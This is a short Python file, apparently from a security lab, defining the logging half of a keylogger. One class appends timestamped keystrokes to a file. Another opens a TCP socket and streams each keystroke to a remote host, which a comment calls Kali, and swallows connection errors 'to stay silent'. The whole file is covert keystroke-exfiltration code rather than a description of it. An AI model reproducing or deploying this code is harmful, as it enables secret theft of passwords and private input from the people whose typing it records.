import socket
import datetime

class Filelogger:
    def __init__(self, filename):
        self.filename = filename

    def log_keystroke(self, key):
        with open(self.filename, 'a') as f:
            time = datetime.datetime.now().isoformat()
            log = f"{str(time)}:{key}\n"
            f.write(log)

class NetworkLogger:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((self.host, self.port))
        except Exception:
            pass # In a lab, we ignore connection errors to stay silent

    def log_keystroke(self, key):
        try:
            # Sends the key directly to Kali
            self.sock.send(f"{key}".encode('utf-8'))
        except Exception:
            pass
